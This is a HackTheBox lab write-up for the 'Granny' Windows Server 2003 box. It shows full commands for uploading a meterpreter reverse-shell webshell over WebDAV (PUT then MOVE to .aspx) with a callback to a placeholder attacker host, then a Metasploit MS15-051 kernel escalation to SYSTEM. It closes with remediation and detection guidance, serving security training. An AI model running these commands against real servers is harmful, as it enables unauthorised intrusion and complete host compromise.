---
layout: default
title: "HackTheBox - Granny"
---

# HackTheBox - Granny

**OS:** Windows Server 2003 SP2 (x86, IIS 6.0)

Granny is a Windows Server 2003 box running IIS 6.0 with WebDAV enabled. Initial access comes from
WebDAV's ability to upload a file under an inert extension and then rename it to an executable one,
landing a webshell as the low-privileged `NT AUTHORITY\NETWORK SERVICE` account. That account holds
`SeImpersonatePrivilege`, but on 2003 SP2 the usual token-impersonation and `getsystem` techniques
fail, so privilege escalation uses a kernel exploit (MS15-051) to reach `NT AUTHORITY\SYSTEM`.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (Granny) |
| OS | Windows Server 2003 SP2 (x86, build 5.2.3790) |
| Initial Access | IIS 6.0 WebDAV upload (PUT -> MOVE -> .aspx) |
| Privilege Escalation | MS15-051 (`win32k` ClientCopyImage) kernel LPE (CVE-2015-1701) |
| Final Access | `NT AUTHORITY\SYSTEM` |

---

## Recon

### Port Scan

A full TCP sweep shows a single open port, 80/tcp, serving the legacy IIS 6.0:

```text
$ nmap -p- --min-rate 5000 <target-ip>
PORT   STATE SERVICE
80/tcp open  http

$ nmap -sCV -p80 <target-ip>
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
```

| Port | Proto | Service | Notes |
|---|---|---|---|
| 80 | TCP | HTTP | Microsoft IIS 6.0, ASP.NET, WebDAV write methods enabled |

### WebDAV Surface

The HTTP fingerprint and an `OPTIONS` request confirm IIS 6.0 with WebDAV write verbs enabled:

```text
$ curl -s -X OPTIONS http://<target-ip>/ -i
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, ...
```

IIS 6.0 + WebDAV with `PUT` and `MOVE` allowed is the whole attack surface. Two known paths exist:
CVE-2017-7269 (the `ScStoragePathFromUrl` buffer overflow in the WebDAV `PROPFIND` handler) and a
WebDAV file upload. The upload path is used here (see Lessons for why).

> **Why this works:** IIS 6.0 shipped with WebDAV enabled by default and exposes the file-write verbs
> (`PUT`, `MOVE`, `COPY`, `MKCOL`) over plain HTTP. On a server with no authentication on the webroot,
> those verbs let an unauthenticated attacker write files into a directory that can also execute
> server-side code. That combination, write + execute in the same place, is the root of the foothold.

---

## Initial Access — WebDAV upload to webshell

IIS 6.0 WebDAV blocks a `PUT` of executable extensions (`.aspx`) directly, but allows a `PUT` of an
inert extension followed by a WebDAV `MOVE` to rename it. Generate an ASP.NET meterpreter, upload it as
`.txt`, then `MOVE` it to `.aspx`:

```bash
# 1. payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f aspx -o shell.aspx

# 2. handler
# msf> use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <attacker>; run

# 3. upload via WebDAV: PUT as .txt, then MOVE to .aspx
curl -T shell.aspx http://<target-ip>/shell.txt                                       # 201 Created
curl -X MOVE -H "Destination: http://<target-ip>/shell.aspx" http://<target-ip>/shell.txt   # 201 Created

# 4. trigger
curl http://<target-ip>/shell.aspx
```

The webshell executes inside the IIS worker and calls back:

```text
[*] Meterpreter session opened ... 
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

> **Why this works:** The extension allow-list is only enforced on the `PUT` request, not on the final
> filename after a `MOVE`. Uploading `shell.txt` (an "inert" extension WebDAV accepts) and then issuing
> `MOVE` with a `.aspx` destination drops a server-executable file into the webroot. When `.aspx` is
> requested, the ASP.NET handler compiles and runs it inside the IIS worker process, which is running
> as `NETWORK SERVICE`, yielding code execution as that account.

> **Gotcha worth recording:** Confirm the upload directory is actually executable. The default IIS
> webroot is; some WebDAV-writable folders are configured script-disabled, in which case the `.aspx`
> returns its source instead of executing, and a different writable+executable path is needed.

---

## Post-Exploitation Enumeration

```text
meterpreter > sysinfo
OS       : Windows .NET Server (5.2 Build 3790, Service Pack 2)
Arch     : x86

meterpreter > getprivs
SeAssignPrimaryTokenPrivilege
SeImpersonatePrivilege
...
```

`SeImpersonatePrivilege` is present, but on Windows 2003 SP2 `getsystem` fails (all named-pipe /
token-duplication / *Potato variants report "not supported on this system"), and `incognito`
`list_tokens` shows no privileged token to impersonate. So token abuse is out; a kernel exploit is the
path. `local_exploit_suggester` confirms the box is vulnerable to several, including MS14-058,
MS14-070, MS15-051, and MS16-075.

> **Why this works:** The modern `SeImpersonate` escalation primitives (Juicy/Rogue/PrintSpoofer and
> meterpreter's `getsystem`) rely on RPC/named-pipe and COM behaviours introduced after Server 2003,
> so they are genuinely unsupported here. On an unpatched 2003 kernel, a `win32k.sys` LPE is the
> reliable alternative, and `local_exploit_suggester` enumerates which patches are missing rather than
> guessing.

---

## Privilege Escalation — MS15-051

MS15-051 (`win32k.sys` `ClientCopyImage` LPE, CVE-2015-1701) is reliable on 2003 x86. Run the local
exploit against the existing session:

```text
msf> use exploit/windows/local/ms15_051_client_copy_image
msf> set SESSION <id>
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST <attacker>; set LPORT 4445
msf> run

[+] Process N launched.
[*] Reflectively injecting the DLL ...
[*] Meterpreter session opened ...
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

> **Why this works:** MS15-051 abuses a flaw in the `win32k.sys` `ClientCopyImage` handling where a
> user-mode callback can leave a kernel structure in an attacker-controlled state, allowing a write
> into kernel memory. The exploit uses it to swap the current process token for the SYSTEM token. It is
> a local exploit, so it runs against the existing `NETWORK SERVICE` session rather than over the
> network.

Both proofs are then readable as SYSTEM:

```text
meterpreter > cat "c:/Documents and Settings/Lakis/Desktop/user.txt"
<user-flag-redacted>
meterpreter > cat "c:/Documents and Settings/Administrator/Desktop/root.txt"
<root-flag-redacted>
```

---

## Root Cause

Granny falls to a chain of two distinct failures, each tied to an end-of-life platform:

1. **WebDAV write-to-execute on IIS 6.0.** WebDAV is enabled and unauthenticated, the file-write verbs
   (`PUT`/`MOVE`) are allowed, and the writable directory also executes ASP.NET. The `PUT` extension
   filter is trivially bypassed by uploading inert then renaming with `MOVE`.
2. **Unpatched 2003 kernel.** The host is missing MS15-051 (and several other kernel patches), so any
   code-execution foothold escalates straight to SYSTEM via a public local exploit.

Remove either link, take WebDAV write away from the webroot, or patch the kernel, and the path to
SYSTEM breaks.

## Impact

Complete compromise of the host as `NT AUTHORITY\SYSTEM`, the highest local privilege. An
unauthenticated attacker on the network gains code execution through WebDAV and then full control of
the machine, with read/write over all files, services, and credentials, including the local SAM
hashes. As an internet-unauthenticated, end-of-life Windows Server 2003 system, it represents total
loss of confidentiality and integrity and would be a launch point for lateral movement in a real
network.

## Remediation

Recommendations are ordered by priority. The first item breaks the demonstrated path outright; the
rest are hardening.

**1. Decommission Windows Server 2003 (highest priority).** The OS is end-of-life and receives no
security updates; MS15-051, the WebDAV chain, and many other unpatched issues cannot be reliably
mitigated on a supported basis. Migrate the workload to a supported platform.

**2. Disable WebDAV, or remove write verbs from the webroot.** If WebDAV is not required, disable it
entirely. If it is, restrict `PUT`/`MOVE`/`COPY`/`MKCOL`/`PROPFIND` to authenticated, authorized users
and ensure no directory is simultaneously WebDAV-writable and script-executable.

**3. Apply missing kernel patches.** On any system that must remain, install MS15-051 and the other
patches flagged by enumeration (MS14-058, MS14-070, MS16-075) so a foothold cannot trivially escalate.

**4. Least-privilege the IIS worker.** Run the application pool under a constrained identity and remove
`SeImpersonatePrivilege` where the workload does not require it, raising the cost of token-based
escalation on patched systems.

### Validation

- Re-send an `OPTIONS` request and confirm `PUT`/`MOVE` are no longer advertised or are rejected
  unauthenticated; confirm a `PUT` of `shell.txt` returns `403`/`405`.
- After patching, re-run `local_exploit_suggester` (or check `systeminfo` hotfix list) and confirm
  MS15-051 and the other LPEs no longer apply.

## Detection Opportunities

- **WebDAV upload chain:** IIS logs (`%SystemRoot%\System32\LogFiles`) showing a `PUT` of a non-script
  extension immediately followed by a `MOVE` to `.aspx`/`.asp`, then a `GET` of the new file, is a
  high-fidelity webshell-drop signature.
- **Webshell execution:** the IIS worker (`w3wp.exe` / `inetinfo.exe`) spawning `cmd.exe` or unusual
  child processes, and outbound connections from the web server to an external host (the meterpreter
  callback).
- **Kernel LPE:** unexpected process creation and integrity-level transitions to SYSTEM originating
  from the `NETWORK SERVICE` web worker; crashes or anomalous activity in `win32k.sys`.
- **Webroot integrity:** file-integrity monitoring on `C:\Inetpub\wwwroot` flagging new executable
  files such as `shell.aspx`.

## Lessons Learned

- **Prefer the WebDAV upload over the `scstoragepathfromurl` brute.** The Metasploit
  `iis_webdav_scstoragepathfromurl` module brute-forces path lengths 3..60, firing a buffer overflow at
  each. On this run it hung the WebDAV worker before a session landed, static `GET` still returned 200
  while `PUT`/`PROPFIND` timed out, and the box needed a reset. The deterministic PUT -> MOVE -> trigger
  upload reaches the same foothold without risking the service.
- **On Windows 2003, `SeImpersonate` does not imply `getsystem`.** The modern impersonation primitives
  are unsupported, so fall through to a kernel LPE chosen with `local_exploit_suggester`.

---

## Cleanup

- Removed the uploaded webshell from the webroot: `del c:\Inetpub\wwwroot\shell.aspx` (the `shell.txt`
  staging file was consumed by the `MOVE`). Verified `GET /shell.aspx -> 404`.
- No accounts created; no persistence left. Meterpreter sessions and the multi/handler jobs were
  terminated at the end of the run.
